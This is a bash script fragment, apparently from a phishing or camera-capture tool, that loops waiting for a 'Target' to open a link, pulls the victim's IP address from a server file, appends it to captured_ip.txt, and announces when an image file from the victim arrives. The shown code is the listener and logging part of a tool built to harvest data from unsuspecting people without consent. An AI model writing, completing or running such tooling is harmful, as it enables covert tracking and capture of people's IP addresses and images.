#!/bin/bash

extract_ip() {
    ip=$(grep 'IP:' "$SCRIPT_DIR/.server/ip.txt" | cut -d " " -f2 | tr -d '\r')

    if [[ -n "$ip" ]]; then
        printf "    ${cyan}[${green}+${cyan}]${white} IP: ${orange}%s\n" "$ip"
        cat "$SCRIPT_DIR/.server/ip.txt" >> "$SCRIPT_DIR/captured_ip.txt"
    fi
}

checked(){
    echo ""
    echo "    ${cyan}[${green}-${cyan}]${white} Waiting for Target, Press ${red}Ctrl + C${white} to exit... ${nocolor}"
    trap terminate INT

    while true; do
        if [[ -e "$SCRIPT_DIR/.server/ip.txt" ]]; then
            echo "    ${cyan}[${green}✓${cyan}]${white} Target opened the link ${nocolor}"
            extract_ip
            rm -f "$SCRIPT_DIR/.server/ip.txt"
        fi

        sleep 0.5

        if [[ -e "$SCRIPT_DIR/.server/Logs.log" ]]; then
            echo "    ${cyan}[${green}✓${cyan}]${white} image file received! ${nocolor}"
            rm -f "$SCRIPT_DIR/.server/Logs.log"
        fi

        sleep 0.5
        
    done
}
